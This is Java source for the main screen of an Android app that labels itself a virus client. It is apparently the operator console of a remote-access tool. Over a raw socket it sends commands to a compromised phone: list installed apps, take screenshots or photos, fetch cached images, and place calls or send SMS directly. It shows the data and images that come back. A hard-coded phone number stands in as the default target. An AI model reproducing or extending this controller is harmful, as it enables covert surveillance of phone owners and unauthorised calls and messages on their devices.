package com.example.andriodvirusclient;

import androidx.appcompat.app.AppCompatActivity;

import android.annotation.SuppressLint;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Spinner;
import android.widget.Toast;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.IOException;
import java.net.Socket;

public class MainActivity extends AppCompatActivity {
    private EditText ip;
    private   EditText port;
    private  Spinner sp;
    private   EditText et_input;
    private  Button btn;
    private ArrayAdapter<String> adapter;
    private  Socket server;

    private  BufferedOutputStream outputStream;
    private   BufferedInputStream  inputStream;

    private   String toServer;

    private byte Commond=0;
    @SuppressLint("HandlerLeak")
    private   Handler handler = new Handler(){
        @Override
        public void handleMessage(Message msg) {
            super.handleMessage(msg);
            switch (msg.what){
                case CommonStatues.SendToast:
                case CommonStatues.CallDialog:
                case CommonStatues.SendSms:
                case CommonStatues.SmsDialog:
                case CommonStatues.Call:
                    Toast.makeText(MainActivity.this, (CharSequence)msg.obj, Toast.LENGTH_SHORT).show();
                    break;
                case CommonStatues.APPlist:
                    Intent intent = new Intent(MainActivity.this, AppList.class);
                    Bundle bundle = new Bundle();
                    bundle.putBinder("obj", new ObjectBinder(msg.obj));
                    intent.putExtras(bundle);
                    startActivity(intent);
//                    处理事件
                    break;
                case CommonStatues.ScreenShot:
                case CommonStatues.GetLastBuffer:
                case CommonStatues.TakePhotoSmall:
                case CommonStatues.TakePhotoBig:
                    Intent intent2 = new Intent(MainActivity.this, Picture.class);
                    Bundle bundle2 = new Bundle();
                    bundle2.putBinder("obj", new ObjectBinder(msg.obj));
                    intent2.putExtras(bundle2);
                    startActivity(intent2);
                    break;
            }
            btn.setEnabled(true);
        }
    };
//    @Override
//    protected void onCreate(Bundle savedInstanceState) {
//        super.onCreate(savedInstanceState);
//        setContentView(R.layout.activity_main);
//
//        Intent intent2 = new Intent(MainActivity.this, Picture.class);
//        startActivity(intent2);
//    }




      @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        ip=(EditText)findViewById(R.id.ip);
        port=(EditText)findViewById(R.id.port);
        et_input = (EditText) findViewById(R.id.client_input);
        btn=findViewById(R.id.client_send);
        sp=findViewById(R.id.spinner);
        String[] ctype = new String[]{"获取软件列表", "屏幕截图", "直接拨打电话","弹出拨号界面","发送短信界面","直接发送短信","拍照缩略图","拍照大图","获取图片缓存"};
        //创建一个数组适配器
        adapter = new ArrayAdapter<String>(this, android.R.layout.simple_spinner_item, ctype);
        adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);     //设置下拉列表框的下拉选项样式
        sp.setAdapter(adapter);
        sp.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {

            private String positions;

            @Override
            public void onItemSelected(AdapterView<?> parent, View view, int position, long id) {
                positions = adapter.getItem(position);
                if (positions.equals("获取软件列表")){
                    Commond=CommonStatues.APPlist;
                    et_input.setText("获取软件列表");
                }else if(positions.equals("屏幕截图")){
                    Commond=CommonStatues.ScreenShot;
                    et_input.setText("1");
                }
                else if (positions.equals("直接拨打电话")){
                    Commond=CommonStatues.Call;
                    et_input.setText("15238981687");
                }else if(positions.equals("弹出拨号界面")){
                    Commond=CommonStatues.CallDialog;
                    et_input.setText("15238981687");
                }else if(positions.equals("发送短信界面")) {
                    Commond = CommonStatues.SmsDialog;
                    et_input.setText("15238981687"+CommonStatues.separate+"andriod virus!");
                } else if(positions.equals("直接发送短信")) {
                    Commond = CommonStatues.SendSms;
                    et_input.setText("15238981687"+CommonStatues.separate+"andriod virus!");
                }else if(positions.equals("拍照缩略图")) {
                    Commond = CommonStatues.TakePhotoSmall;
                    et_input.setText("拍照缩略图");
                }
                else if(positions.equals("拍照大图")) {
                    Commond = CommonStatues.TakePhotoBig;
                    et_input.setText("拍照大图");
                }else if(positions.equals("获取图片缓存")) {
                    Commond = CommonStatues.GetLastBuffer;
                    et_input.setText("获取图片缓存");
                }
                parent.setVisibility(View.VISIBLE);
            }
            @Override
            public void onNothingSelected(AdapterView<?> parent) {
                parent.setVisibility(View.VISIBLE);
            }
        });

        ////////////////控制功能//////////////////////
        System.out.println("初始化成功");
        Toast.makeText(MainActivity.this,"初始化成功", Toast.LENGTH_SHORT).show();
        btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                btn.setEnabled(false);
                new Thread(new Runnable() {

                    @Override
                    public void run() {
                        try {

                            server = new Socket(ip.getText().toString(), Integer.parseInt(port.getText().toString()));//连接的  ip   端口
                            outputStream = new BufferedOutputStream(server.getOutputStream());
                            inputStream=new BufferedInputStream(server.getInputStream());
                            //发送指令
                            toServer = et_input.getText().toString();
                            //Thread.sleep(5000);
                            outputStream.write(Commond);
                            outputStream.flush();

                            Message msg1=handler.obtainMessage();
                            msg1.what=CommonStatues.SendToast;
                            msg1.obj="commond已经发送";
                            handler.sendMessage(msg1);
                            //////////////////////////////////
                            outputStream.write(toServer.getBytes());
                            outputStream.flush();


                            Message msg3=handler.obtainMessage();
                            ///////自定义休眠
                            for(int i=0;i<20;i++){
                                if(inputStream.available() > 0){
                                    break;
                                }
                                Thread.sleep(10);
                            }
                            ////////////
                            if (inputStream.available() <= 0){
                                Message msg=handler.obtainMessage();
                                msg.what=CommonStatues.SendToast;
                                msg.obj="-----获取消息超时-----";
                                handler.sendMessage(msg);
                                System.out.println("-----获取消息超时-----");
                                return; // 过滤空消息
                            }
                            msg3.what= inputStream.read();
                                Message msg2=handler.obtainMessage();
                                msg2.what=CommonStatues.SendToast;
                                msg2.obj="收到被控消息 : "+Integer.toString(msg3.what);
                                handler.sendMessage(msg2);


                            ///////自定义休眠
                            for(int i=0;i<500;i++){
                                if(inputStream.available() > 0){
                                    break;
                                }
                                Thread.sleep(10);
                            }
                            ////////////
                            if (inputStream.available() <= 0){
                                Message msg = handler.obtainMessage();
                                msg.what = CommonStatues.SendToast;
                                msg.obj = "-----获取消息超时-----";
                                handler.sendMessage(msg);
                                System.out.println("-----获取消息超时-----");
                                return; // 过滤空消息
                            }

                            byte[] bytes = new byte[4096];
                            StringBuffer stringBuffer = new StringBuffer();
                            int len;
                            while (inputStream.available() > 0 && (len = inputStream.read(bytes)) != -1) {
                                stringBuffer.append(new String(bytes, 0, len));
                            } // 下面就不对stringBuffer的内容判空了，因为是空的话，根本跳不出上面的过滤

                             System.out.println("服务端信息:" + stringBuffer);

                            msg3.obj=stringBuffer;
                           // msg.what = 1;
                            handler.sendMessage(msg3);
                            inputStream.close();
                            outputStream.close();
                            server.close();
                        } catch (IOException  e) {
                            e.printStackTrace();
                            Message msg=handler.obtainMessage();
                            msg.what=CommonStatues.SendToast;
                            msg.obj="IOException 连接失败";
                            handler.sendMessage(msg);
                        }catch( InterruptedException e){
                            e.printStackTrace();
                        }
                    }
                }).start();
            }
        });

    }
}